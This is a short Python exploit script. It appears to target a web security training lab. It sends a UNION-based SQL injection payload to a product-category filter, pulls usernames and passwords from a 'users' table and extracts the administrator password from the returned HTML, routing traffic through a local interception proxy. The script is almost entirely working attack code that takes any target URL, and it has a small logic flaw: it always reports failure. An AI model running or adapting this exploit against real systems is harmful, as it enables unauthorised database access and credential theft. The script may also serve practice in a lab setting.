import requests
import urllib3
import sys
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def exploit_sqli_user_table(url):
    username='administrator'
    path='/filter?category=Pets'
    sql_payload="' UNION SELECT NULL,username || ' = ' || password FROM users--"
    r=requests.get(url+path+sql_payload,verify=False,proxies=proxies)
    res=r.text
    if "administrator" in res:
        print("(+)Successfully found the administrator password.....")
        soup=BeautifulSoup(r.text,'html.parser')
        admin_text=soup.body.find(text=lambda x: x and "administrator" in x)
        if admin_text:
            admin_pass=admin_text.split(" = ")[1].strip() #get the part after "="
            print(f"(+)Successfully get the admin password i.e {admin_pass}")
        else:
            print("(-)Failed to get the admin pass")    
    return False        


            
 
if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
        
    except IndexError:   
        print("(-) Usage %s <url>" % sys.argv[0])
        print("(-) Example %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("(**)Dumping the list of username and password............")    
    if not exploit_sqli_user_table(url):
        print("(-)Failed to exploit the usertable of sqli")
        